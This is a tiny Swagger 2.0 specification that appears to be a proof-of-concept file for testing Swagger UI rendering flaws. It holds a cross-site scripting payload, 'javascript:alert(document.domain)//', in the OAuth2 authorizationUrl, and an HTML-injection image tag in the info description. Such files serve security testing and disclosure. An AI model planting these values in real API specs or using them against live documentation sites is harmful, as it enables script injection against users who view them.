swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    authorizationUrl: javascript:alert(document.domain)//
info:
  version: "0.0.1"
  title: Example Title
  description: html injection <img src=https://cdn.acunetix.com/wp-content/uploads/2020/01/11111323/html-injection-910x478.png/>
paths:
  /:
    get:
      responses:
        200:
          description: Successful respons
